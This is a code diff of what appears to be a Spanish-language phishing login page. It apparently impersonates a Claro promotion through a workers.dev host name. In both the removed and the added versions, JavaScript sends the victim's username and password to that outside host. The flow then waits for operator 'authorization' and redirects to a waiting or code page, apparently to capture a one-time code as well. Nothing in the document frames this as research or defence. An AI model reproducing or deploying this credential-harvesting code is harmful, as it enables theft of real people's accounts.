@@ -1,57 +1,20 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Login</title>
-</head>
-<body>
-  <h2>Formulario de Acceso</h2>
-  <form id="loginForm">
-    <label>Usuario:</label>
-    <input type="text" id="usuario" required><br><br>
+<script>
+  document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const usuario = document.getElementById("usuario").value;
+    const clave = document.getElementById("clave").value;
 
-    <label>Clave:</label>
-    <input type="password" id="clave" required><br><br>
-
-    <button type="submit">Enviar</button>
-  </form>
-
-  <h2>Ingresando...</h2>
-  <p id="status">Esperando autorización...</p>
-
-  <script>
-    const statusEl = document.getElementById("status");
-    let currentId = null;
-
-    document.getElementById("loginForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const usuario = document.getElementById("usuario").value;
-      const clave = document.getElementById("clave").value;
-
-      const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ usuario, clave })
-      });
-
-      const data = await res.json();
-      if(data.ok){
-        statusEl.textContent = "Formulario enviado. Esperando autorización...";
-        currentId = data.id;
-
-        // Inicia polling
-        const interval = setInterval(async () => {
-          const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${currentId}`);
-          const statusData = await statusRes.json();
-          if(statusData.autorizado){
-            clearInterval(interval);
-            window.location.href = "codigo.html";
-          }
-        }, 3000);
-      } else {
-        alert("Error: " + data.error);
-      }
+    const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({usuario, clave})
     });
-  </script>
-</body>
-</html>
+    const data = await res.json();
+    if(data.ok){
+      localStorage.setItem("login_id", data.id); // Guardamos id para polling
+      window.location.href = "esperando.html";   // Redirigimos a la página de espera
+    } else {
+      alert("Error al enviar");
+    }
+  });
+</script>
